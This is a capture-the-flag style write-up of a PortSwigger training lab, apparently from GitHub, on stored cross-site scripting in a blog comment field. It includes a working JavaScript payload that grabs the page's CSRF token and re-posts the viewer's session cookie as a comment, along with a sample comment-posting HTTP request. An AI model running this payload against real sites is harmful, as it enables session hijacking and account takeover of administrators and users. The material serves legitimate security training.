<h1>Exploiting Stored XSS To Hijack Sessions - FOR EDUCATIONAL PURPOSES ONLY</h1>

<h2>Scenario</h2>

<mark>This is a Portswigger Lab, not a real application.</mark>

We are testing a blog application that allows users to post comments on each other's blog posts. A site administrator reads every comment for administrator purposes. We identified a Stored XSS in the blog comment field, 
but we don't have BurpSuite Collaborator to send victim session cookies to ourself. In this case, we can make the victim post their session cookie as a blog comment. 

Analyze the images below to confirm the stored xss in the comment field.

<img width="1394" height="432" alt="blog-application-home" src="https://github.com/user-attachments/assets/b31323ff-0cc0-4a9a-8e94-86d083ce4826" />

<img width="1318" height="897" alt="blog-application-lab-xss-payload-in-comment-field" src="https://github.com/user-attachments/assets/a86b7647-384a-4492-b6d4-8cb154983e75" />

<img width="1280" height="598" alt="blog-application-lab-xss-confirmed-in-comment-field" src="https://github.com/user-attachments/assets/c12a62fc-deba-4508-a3df-ba09914be61c" />


<h3>Steps To Reproduce</h3>

1. First we must analyze the comment posting flow. We must identify if csrf tokens are required, and how to collect them. The CSRF token value will naturally be on the same page we are viewing the post comment on. We can
   collect this with a GET request to https://0a54004904a2b38380fe0320002c0039.web-security-academy.net/post?postId=1

   <img width="1413" height="632" alt="where-to-find-csrf-tokens-on-the-blog-application" src="https://github.com/user-attachments/assets/570ee538-13fc-40df-8cbe-97e35715ce65" />

2. We must also identify how to post comments to the blog application. Through using the application, we find the following HTTP request is sent when we post a comment on a blog post.

```
POST /post/comment HTTP/2
Host: 0a54004904a2b38380fe0320002c0039.web-security-academy.net
Cookie: session=9rkCrKAJpnN4iZTzRjg3rJ57ipEJpjIm
Content-Type: application/x-www-form-urlencoded
Content-Length: 172

csrf=dkwNtPM6ySXFHe886VGnSFB4Kgz1Bzrz&postId=2&comment=testComment6942031337&name=testName6942031337&email=testemail6942031337%40testemail.com&website=http%3A%2F%2Ftest.com
```

3. Using the information from Steps 1 and 2, we can create a script that will make the site administrator post their cookies as a comment. Session cookies do not have the Http-Only security attribute, so this cookie can be
   accessed by javascript on the page. Post the following script as a blog comment on postId=1 and when the site administrator reads the comment, the stored xss will execute in their browser and they will post their
   cookies as a comment on postId=1

```
<script>
    var req = new XMLHttpRequest();

    req.onload = function() {
        var match = this.responseText.match(
            /name=["']csrf["'][^>]*value=["']([^"']+)["']/
        );

        if (!match) {
            return;
        }

        var csrf = match[1];

        var postReq = new XMLHttpRequest();
        postReq.open("POST", "/post/comment", true);
        postReq.setRequestHeader(
            "Content-Type",
            "application/x-www-form-urlencoded"
        );

        postReq.send(
            "csrf=" + encodeURIComponent(csrf) +
            "&postId=1" +
            "&comment=" + encodeURIComponent(document.cookie) +
            "&name=admin" +
            "&email=admin%40test.com" +
            "&website=http%3A%2F%2Ftest.com"
        );
    };

    req.open("GET", "/post?postId=1", true);
    req.send();
</script>
```

<img width="1295" height="893" alt="blog-application-stored-xss-payload-to-post-session-cookie-as-blog-comment" src="https://github.com/user-attachments/assets/caa51e20-8663-4f54-9ccc-dc9f0ee38199" />


4. After posting the script as a comment, use Burpsuite Repeater to make a GET request to the page where you made the site administrator post their session cookie as a blog comment. If we view the page in our browser, the xss    will trigger in our browser and you will accidently post your session cookie as a blog comment, as well. Notice all of the site administrator's (secret cookie and session cookie) are in the response as blog comments.

   <img width="1415" height="634" alt="stored-xss-execution-successful-and-admin-session-cookie-and-secret-cookie-posted-as-blog-comment" src="https://github.com/user-attachments/assets/1f72067e-1a60-4a21-8897-6b76b5c9a223" />


5. You can now use the site administrator's session cookie, we have successfully hijacked the administrator's session and solved the lab.

   <img width="1384" height="643" alt="blog-application-stored-xss-successful-session-hijacking" src="https://github.com/user-attachments/assets/c1807dd7-3456-4823-a559-740f4e48af8d" />



   

   
